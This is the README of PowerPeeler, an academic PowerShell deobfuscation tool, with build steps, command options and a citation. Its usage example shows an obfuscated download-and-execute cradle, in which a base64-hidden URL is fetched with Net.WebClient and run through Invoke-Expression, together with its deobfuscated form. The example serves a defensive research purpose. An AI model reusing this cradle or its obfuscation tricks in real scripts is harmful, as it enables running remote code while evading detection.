# PowerPeeler

>一款通用且精确的PowerShell脚本反混淆器



### 相关资料

- 会议版论文：in coming
- 完整版论文：[arxiv](https://arxiv.org/abs/2406.04027)



### 使用方法

1. 编译环境需求

   - 基本环境：参见[PowerShell官方编译指南](https://github.com/PowerShell/PowerShell#building-the-repository)
   - .net core 7.0.101
   - pwsh/powershell

2. 运行环境

   - PSScriptAnalyzer（可选，用于代码格式化）
   - [Invoke-Deobfuscation](https://gitee.com/snowroll/invoke-deobfuscation)（可选，用于动静态结合反混淆）

3. 工具获取

   ```bash
   git clone https://github.com/zhengbili/PowerPeeler
   ```

   或

   ```bash
   git clone https://gitee.com/snowroll/powerpeeler
   ```

4. 沙箱编译

   ```powershell
   cd PowerPeeler
   pwsh ./build.ps1
   ```

5. 工具使用

   1. 切换目录，防止部分恶意脚本污染当前目录：```cd sandbox```
   2. 进入特殊pwsh环境：```../pwsh```
   3. 在特殊pwsh环境中执行反混淆脚本

   ```powershell
   ../Deobfuscation/deob.ps1 --SettingType [Simple|Analysis|SemanticAnalysis]  --InputPath 输入文件位置 --OutputPath 输出文件位置 [-cmd] [-log]
   ```
   ​	```-st --SettingType```	反混淆模式，有几种预设，可自行修改代码
   ​	```-ip --InputPath```	输入文件位置
   ​	```-op --OutputPath```	输出文件位置
   ​	```-cmd --IsCmd```	cmd一句话模式
   ​	```-log --SaveLog```	保存日志，可用于反混淆结构查看器



### 使用示例

> samples/unittest.ps1中包含了多种不同类型的测试样例，可参阅

```../pwsh ../Deobfuscation/deob.ps1 -ip in.ps1 -op out.ps1```

- in.ps1

  ```powershell
  Ie`X ("{2}{0}{1}" -f 'ost h', 'ello', 'write-h')
  $xdjmd  =   'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
  $lsffs =   '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
  $sdfs = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs))
  .($psHoME[4]+$PShOmE[30]+'x') (Ne`W-oB`JeCt Net.Web`C`lient).downloadstring($sdfs)
  ```

- out.ps1

  ```
  Write-Host ([string]'hello')
  $xdjmd = ([string]'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG')
  $lsffs = ([string]'8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA=')
  $sdfs = ([string]'https://test.com/malware.txt')
  .'Invoke-Expression' (New-Object ([string]'Net.WebClient')).DownloadString(([string]'https://test.com/malware.txt'))
  ```



### 反混淆结构查看器

> 参考二进制反混淆的层级结构查看器

由于采用了直接变量替换，直接采用反混淆脚本存在部分反混淆过度的问题。为方便用户自行确定反混淆边界，```Deobfuscation/```下提供了一个简易的反混淆结构查看器。



### 引用格式

```
@misc{li2024powerpeelerprecisegeneraldynamic,
      title={PowerPeeler: A Precise and General Dynamic Deobfuscation Method for PowerShell Scripts}, 
      author={Ruijie Li and Chenyang Zhang and Huajun Chai and Lingyun Ying and Haixin Duan and Jun Tao},
      year={2024},
      eprint={2406.04027},
      archivePrefix={arXiv},
      primaryClass={cs.CR},
      url={https://arxiv.org/abs/2406.04027}, 
}
```



